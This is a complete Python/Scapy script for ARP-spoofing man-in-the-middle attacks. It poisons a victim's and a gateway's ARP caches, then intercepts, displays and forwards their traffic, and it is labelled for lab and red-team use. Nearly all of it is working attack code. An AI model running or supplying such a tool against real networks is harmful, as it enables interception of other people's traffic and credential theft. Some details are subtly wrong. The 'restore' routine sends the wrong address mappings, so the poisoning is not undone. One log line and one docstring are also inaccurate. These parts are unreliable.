#!/usr/bin/env python3
"""
arp_spoofer_mnl_fwd.py - ARP spoofer using manual forwarding.

Features:
- Unicast ARP poisoning of a victim and gateway.
- Manual packet forwarding at L2, with:
  - TTL decrement
  - Checksum recalculation
  - Optional IP fragmentation for oversized packets.
- Scoped sniffing (BPF filter) to reduce noise.
- "View" mode: print traffic summaries and optionally drop or forward packets.

USAGE EXAMPLE:
    sudo python3 arp_spoofer_mnl_fwd.py --iface eth0 \
                             --victim 192.168.2.8 \
                             --gateway 192.168.2.254 \
                             --client 192.168.3.1 \
                             --view
"""

import argparse
import signal
import sys
import time
from threading import Thread

from scapy.all import (
    ARP,
    Ether,
    IP,
    TCP,
    UDP,
    conf,
    sniff,
    srp,
    sendp,
    fragment,
)

# --- Global constants / state -------------------------------------------------

MTU = 1500              # Typical MTU
IP_HDR_SIZE = 20        # Approx. IP header size (no options)
POISON_INTERVAL = 1.0   # Seconds between ARP poison bursts

running = True
forward_count = 0


# --- Helper functions ---------------------------------------------------------

def resolve_mac(ip: str, iface: str, tries: int = 6, timeout: int = 2) -> str:
    """
    Resolve the MAC address for a given IP using ARP (and only that).

    Returns:
        MAC address as string if found, otherwise None.
    """
    for _ in range(tries):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=timeout, iface=iface, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        time.sleep(0.2)
    return None


def send_unicast_arp_reply(
    target_ip: str,
    target_mac: str,
    spoof_ip: str,
    attacker_mac: str,
    iface: str,
    count: int = 3,
) -> None:
    """
    Send unicast ARP replies telling `target_ip` that `spoof_ip` is at `attacker_mac`.

    Args:
        target_ip: IP address of the target.
        target_mac: MAC address of the target.
        spoof_ip: IP address of the attacker.
        attacker_mac: MAC address of the attacker.
        iface: Network interface to use.
        count: Number of packets to send.
    """
    arp = ARP(
        op=2,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
        pdst=target_ip,
        hwdst=target_mac,
    )
    frame = Ether(dst=target_mac, src=attacker_mac) / arp
    sendp(frame, iface=iface, count=count, verbose=False)


def poison_loop(ctx: dict) -> None:
    """
    Periodically send ARP poison packets to victim & gateway.
    """
    global running
    while running:
        try:
            # Tell gateway "victim is at attacker MAC"
            send_unicast_arp_reply(
                ctx["gateway_ip"],
                ctx["gateway_mac"],
                ctx["victim_ip"],
                ctx["attacker_mac"],
                ctx["iface"],
                count=3,
            )
            # Tell victim "gateway is at attacker MAC"
            send_unicast_arp_reply(
                ctx["victim_ip"],
                ctx["victim_mac"],
                ctx["gateway_ip"],
                ctx["attacker_mac"],
                ctx["iface"],
                count=3,
            )
        except Exception as e:
            print(f"[!] poison exception: {e}")
        time.sleep(POISON_INTERVAL)


def restore_arp(ctx: dict) -> None:
    """
    Restore ARP caches for victim and gateway back to legitimate mappings.
    """
    try:
        # Gateway: map gateway_ip -> gateway_mac
        send_unicast_arp_reply(
            ctx["gateway_ip"],
            ctx["gateway_mac"],
            ctx["gateway_ip"],
            ctx["gateway_mac"],
            ctx["iface"],
            count=4,
        )
        # Victim: map victim_ip -> victim_mac
        send_unicast_arp_reply(
            ctx["victim_ip"],
            ctx["victim_mac"],
            ctx["victim_ip"],
            ctx["victim_mac"],
            ctx["iface"],
            count=4,
        )
        print("[+] ARP tables restored (best effort).")
    except Exception as e:
        print(f"[!] restore exception: {e}")


def decide_action(packet: IP, view: bool) -> str:
    """
    Decide what to do with the given IP packet.

    Args:
        packet: A Scapy IP layer.
        view: If True, print a brief summary.

    Returns:
        "forward" or "drop".

    You can customize this function to implement:
    - selective dropping
    - logging only specific ports
    - simple content-based filters
    """
    if view:
        l4 = packet.payload
        proto = packet.proto
        info = ""

        if isinstance(l4, TCP):
            info = f"TCP {l4.sport}->{l4.dport}"
        elif isinstance(l4, UDP):
            info = f"UDP {l4.sport}->{l4.dport}"
        else:
            info = f"proto={proto}"

        print(f"[VIEW] {packet.src} -> {packet.dst}  {info}")

    # Default: always forward. Change logic here if you want drops.
    return "forward"


def forward_packet(pkt, ctx: dict, view: bool, do_fragment: bool) -> None:
    """
    Handle a single sniffed packet:
    - verify it is part of flows we care about
    - optionally print info
    - forward or drop based on `decide_action`
    - handle TTL, checksum, and optional fragmentation
    """
    global forward_count

    if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
        return

    eth = pkt[Ether]
    ip_layer = pkt[IP]

    # Avoid forwarding packets we injected
    if eth.src.lower() == ctx["attacker_mac"].lower():
        return

    # Learn client MAC on the fly (optional)
    if ctx.get("client_ip") and ip_layer.src == ctx["client_ip"] and ctx.get("client_mac") is None:
        ctx["client_mac"] = eth.src
        print(f"[+] Learned client_mac={ctx['client_mac']}")

    src = ip_layer.src
    dst = ip_layer.dst

    # Limit to victim/gateway(/client) related traffic
    allowed = (
        (src == ctx["victim_ip"] and dst in (ctx["gateway_ip"], ctx.get("client_ip")))
        or (dst == ctx["victim_ip"] and src in (ctx["gateway_ip"], ctx.get("client_ip")))
        or (src == ctx["gateway_ip"] and dst == ctx["victim_ip"])
        or (dst == ctx["gateway_ip"] and src == ctx["victim_ip"])
    )
    if not allowed:
        return

    # Decide whether to forward or drop
    action = decide_action(ip_layer, view=view)
    if action == "drop":
        print(f"[DROP] {src} -> {dst} {ip_layer.proto} {ip_layer.sport} -> {ip_layer.dport}")
        return

    # Adjust TTL and remove checksums
    try:
        if ip_layer.ttl > 0:
            ip_layer.ttl -= 1
        del ip_layer.chksum
    except Exception:
        print("[!] Failed to remove IP checksum")
        pass

    if ip_layer.haslayer(TCP):
        try:
            del ip_layer[TCP].chksum
        except Exception:
            print("[!] Failed to remove TCP checksum")
            pass
    if ip_layer.haslayer(UDP):
        try:
            del ip_layer[UDP].chksum
        except Exception:
            print("[!] Failed to remove UDP checksum")
            pass

    # Determine destination MAC for forwarded frame
    if dst == ctx["victim_ip"]:
        dst_mac = ctx["victim_mac"]
    elif dst == ctx["gateway_ip"]:
        dst_mac = ctx["gateway_mac"]
    elif ctx.get("client_ip") and dst == ctx["client_ip"]:
        dst_mac = ctx.get("client_mac") or ctx["gateway_mac"]
    else:
        # Fallback: send towards gateway
        dst_mac = ctx["gateway_mac"]

    # Fragmentation logic
    try:
        ip_len = len(bytes(ip_layer))
    except Exception:
        ip_len = 0

    max_ip_payload = MTU - len(Ether()) - IP_HDR_SIZE

    try:
        if do_fragment and ip_len > MTU:
            print(f"[!] Fragmenting IP packet ({ip_len} bytes) {src} -> {dst}")
            frags = fragment(ip_layer, fragsize=max_ip_payload)
            for frag in frags:
                new_frame = Ether(src=ctx["attacker_mac"], dst=dst_mac) / frag
                sendp(new_frame, iface=ctx["iface"], verbose=False)
        else:
            new_frame = Ether(src=ctx["attacker_mac"], dst=dst_mac) / ip_layer
            sendp(new_frame, iface=ctx["iface"], verbose=False)
    except Exception as e:
        print(f"[!] sendp/fragment error: {e}")
        return

    forward_count += 1
    if forward_count % 200 == 0:
        print(f"[+] Forwarded {forward_count} packets (last: {src} -> {dst})")


def sniffer(ctx: dict, view: bool, do_fragment: bool) -> None:
    """
    Start sniffing and forwarding packets using a BPF filter for victim/gateway(/client).
    """
    targets = [ctx["victim_ip"], ctx["gateway_ip"]]
    if ctx.get("client_ip"):
        targets.append(ctx["client_ip"])

    bpf = "ip and (" + " or ".join(f"host {ip}" for ip in targets) + ")"
    print(f"[*] Sniffing with BPF: {bpf}")

    sniff(
        iface=ctx["iface"],
        filter=bpf,
        store=False,
        prn=lambda p: forward_packet(p, ctx, view=view, do_fragment=do_fragment),
    )


def sigint_handler_factory(ctx: dict):
    """
    Return a SIGINT handler that restores ARP and exits cleanly.
    """
    def handler(sig, frame):
        global running
        running = False
        print("\n[!] SIGINT received - restoring ARP and exiting...")
        restore_arp(ctx)
        sys.exit(0)
    return handler


# --- Main / CLI ---------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="ARP spoofing MITM tool for lab / red-team exercises.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--iface", required=True, help="Network interface to use (e.g., eth0)")
    parser.add_argument("--victim", required=True, help="Victim IP address to MITM")
    parser.add_argument("--gateway", required=True, help="Gateway IP address")
    parser.add_argument("--client", help="Optional remote client IP to include in flows")
    parser.add_argument("--view", action="store_true", help="Print traffic summaries")
    parser.add_argument(
        "--no-fragment",
        action="store_true",
        help="Disable manual IP fragmentation (let the stack handle it)",
    )

    args = parser.parse_args()

    # Configure Scapy interface
    conf.iface = args.iface

    # Determine attacker MAC
    try:
        attacker_mac = open(f"/sys/class/net/{args.iface}/address").read().strip()
    except Exception:
        attacker_mac = conf.iface.mac if hasattr(conf.iface, "mac") else None

    if not attacker_mac:
        print("[-] Could not determine attacker MAC; aborting.")
        sys.exit(1)

    print("=" * 70)
    print("[*] ARP MITM Tool (LAB / RED-TEAM USE ONLY)")
    print("=" * 70)
    print(f"[+] Interface : {args.iface}")
    print(f"[+] Attacker  : {attacker_mac}")
    print(f"[+] Victim    : {args.victim}")
    print(f"[+] Gateway   : {args.gateway}")
    if args.client:
        print(f"[+] Client    : {args.client}")
    print(f"[+] View mode : {'ON' if args.view else 'OFF'}")
    print(f"[+] Fragment  : {'OFF' if args.no_fragment else 'ON'}")
    print("=" * 70)

    print("[*] Resolving MAC addresses...")
    gw_mac = resolve_mac(args.gateway, args.iface)
    vic_mac = resolve_mac(args.victim, args.iface)

    if not gw_mac:
        print("[-] Failed to resolve gateway MAC; aborting.")
        sys.exit(1)
    if not vic_mac:
        print("[-] Failed to resolve victim MAC; aborting.")
        sys.exit(1)

    print(f"[+] Gateway {args.gateway} -> {gw_mac}")
    print(f"[+] Victim  {args.victim} -> {vic_mac}")

    ctx = {
        "iface": args.iface,
        "victim_ip": args.victim,
        "gateway_ip": args.gateway,
        "victim_mac": vic_mac,
        "gateway_mac": gw_mac,
        "attacker_mac": attacker_mac,
        "client_ip": args.client,
        "client_mac": None,
    }

    # Register SIGINT handler
    signal.signal(signal.SIGINT, sigint_handler_factory(ctx))

    # Initial ARP poisoning
    print("[*] Sending initial ARP poison packets...")
    send_unicast_arp_reply(args.gateway, gw_mac, args.victim, attacker_mac, args.iface, count=4)
    send_unicast_arp_reply(args.victim, vic_mac, args.gateway, attacker_mac, args.iface, count=4)
    time.sleep(0.6)

    # Start poison + sniffer threads
    t_poison = Thread(target=poison_loop, args=(ctx,), daemon=True)
    t_poison.start()
    print("[*] Poison thread started.")

    t_sniff = Thread(
        target=sniffer,
        args=(ctx, args.view, not args.no_fragment),
        daemon=False,  # main thread waits here
    )
    print("[*] Sniffer starting; forwarding traffic. Press Ctrl-C to stop.")
    t_sniff.start()
    t_sniff.join()


if __name__ == "__main__":
    main()
